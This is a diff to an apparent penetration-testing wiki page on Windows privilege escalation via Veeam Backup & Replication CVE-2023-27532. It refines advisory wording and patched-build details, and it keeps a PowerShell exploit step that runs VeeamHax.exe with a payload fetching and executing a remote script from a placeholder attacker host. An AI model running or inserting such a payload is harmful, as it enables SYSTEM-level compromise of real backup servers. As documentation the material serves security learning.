@@ -338,16 +338,17 @@ abusing-auto-updaters-and-ipc.md
 
 ## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)
 
-Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>
+Veeam Backup & Replication and Cloud Connect use a core backup service on **TCP/9401 by default**. [Veeam's advisory](https://www.veeam.com/kb4424) describes unauthenticated disclosure of encrypted configuration-database credentials within the backup network perimeter; a separate public PoC demonstrates a command-execution path as **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> The service may bind beyond localhost, so check its actual address and PID.
 
-- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
+- **Recon**: confirm that TCP/9401 belongs to `Veeam.Backup.Service.exe`, then inspect the installed product and patch metadata. `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` are clues, not a complete patch check.
+- **Fixed floors**: Veeam lists **11a build 11.0.1.1261 P20230227** and **12 build 12.0.0.1420 P20230223** as the first fixed releases; earlier releases are affected. A four-part file version alone cannot distinguish an unpatched base build from a later patch on those same build numbers. Verify the patch identifier against the [vendor build history](https://www.veeam.com/kb2680) before calling a boundary build fixed.
 - **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
 
 ```powershell
 .\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
 ```
 
-The service executes the command as SYSTEM.
+The cited PoC demonstrates command execution as SYSTEM when its additional prerequisites hold; the vendor's advisory describes the credential-disclosure issue.
 ## KrbRelayUp
 
 A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.
